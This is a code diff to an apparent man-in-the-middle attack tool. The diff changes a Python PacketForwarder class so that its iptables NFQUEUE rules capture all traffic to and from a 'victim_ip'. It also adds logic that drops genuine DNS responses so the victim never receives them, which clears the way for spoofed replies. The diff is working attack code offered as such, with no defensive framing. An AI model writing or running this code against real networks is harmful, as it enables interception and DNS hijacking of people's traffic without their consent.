@@ -33,8 +33,8 @@ class PacketForwarder:
         """Insert iptables rules"""
         print("[*] Setting up iptables rules...")
         self.rules = [
-            f"iptables -I FORWARD -s {self.victim_ip} -d {self.server_ip} -j NFQUEUE --queue-num 0",
-            f"iptables -I FORWARD -s {self.server_ip} -d {self.victim_ip} -j NFQUEUE --queue-num 0"
+            f"iptables -I FORWARD -s {self.victim_ip} -j NFQUEUE --queue-num 0",
+            f"iptables -I FORWARD -d {self.victim_ip} -j NFQUEUE --queue-num 0"
         ]
         for rule in self.rules:
             print(f"[+] {rule}")
@@ -44,8 +44,8 @@ class PacketForwarder:
         """Remove iptables rules"""
         print("[*] Removing iptables rules...")
         reverse_rules = [
-            f"iptables -D FORWARD -s {self.victim_ip} -d {self.server_ip} -j NFQUEUE --queue-num 0",
-            f"iptables -D FORWARD -s {self.server_ip} -d {self.victim_ip} -j NFQUEUE --queue-num 0"
+            f"iptables -D FORWARD -s {self.victim_ip} -j NFQUEUE --queue-num 0",
+            f"iptables -D FORWARD -d {self.victim_ip} -j NFQUEUE --queue-num 0"
         ]
         for rule in reverse_rules:
             os.system(f"sudo {rule}")
@@ -59,6 +59,13 @@ class PacketForwarder:
 
             if self.packet_count % 100 == 0:
                 print(f"[*] Processed {self.packet_count} packets")
+            
+            # Check if packet is DNS response from server to victim
+            if pkt.haslayer(DNS) and pkt.haslayer(UDP) and pkt[DNS].qr == 1:
+                if pkt[IP].dst == self.victim_ip and pkt[UDP].sport == 53:
+                    print("[*] Dropping legitimate DNS response from server")
+                    packet.drop()  # Drop legitimate DNS response so victim never sees it
+                    return
 
             packet.accept()
 
